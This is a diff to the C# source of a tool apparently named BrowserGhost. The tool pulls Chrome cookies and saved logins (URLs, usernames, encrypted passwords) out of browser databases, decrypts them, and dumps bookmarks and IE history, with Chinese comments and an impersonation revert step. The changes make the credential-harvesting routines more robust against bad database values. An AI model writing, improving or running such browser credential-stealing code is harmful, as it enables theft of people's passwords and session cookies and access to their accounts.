@@ -366,9 +366,9 @@ namespace BrowserGhost
                 DataTable resultantQuery = database.ExecuteQuery(query);
                 foreach (DataRow row in resultantQuery.Rows)
                 {
-                    string host_key = (string)row["host_key"];
-                    string name = (string)row["name"];
-                    byte[] cookieBytes = Convert.FromBase64String((string)row["encrypted_value"]);
+                    string host_key = (string)row["host_key"].ToString();
+                    string name = (string)row["name"].ToString();
+                    byte[] cookieBytes = Convert.FromBase64String((string)row["encrypted_value"].ToString());
                     string cookie_value;
                     try
                     {
@@ -442,19 +442,15 @@ namespace BrowserGhost
                 {
                     string url;
                     string username;
-                    try
-                    {
-                        url = (string)row["origin_url"];
-                        username = (string)row["username_value"];
-                    }
-                    catch
-                    {
-                        continue;
-                    }
-
-
-                    byte[] passwordBytes = Convert.FromBase64String((string)row["password_value"]);
                     string password;
+                    string crypt_password;
+                    url = (string)row["origin_url"].ToString();
+                    username = (string)row["username_value"].ToString();
+                    crypt_password = row["password_value"].ToString();
+
+
+                    byte[] passwordBytes = Convert.FromBase64String(crypt_password);
+                    
                     try
                     {
                         //老版本解密
@@ -576,7 +572,7 @@ namespace BrowserGhost
                     //密码
                     Console.WriteLine("\n[*]Get Chrome Login Data");
                     Chrome_logins();
-
+                    
                     //获取书签
                     Console.WriteLine("\n[*]Get Chrome Bookmarks");
                     Chrome_books();
@@ -602,7 +598,7 @@ namespace BrowserGhost
 
                     Console.WriteLine("\n[*]Get IE History");
                     IE_history();
-
+                    
                     //回退权限
                     RevertToSelf();
                     Console.WriteLine("[*] Recvtoself");
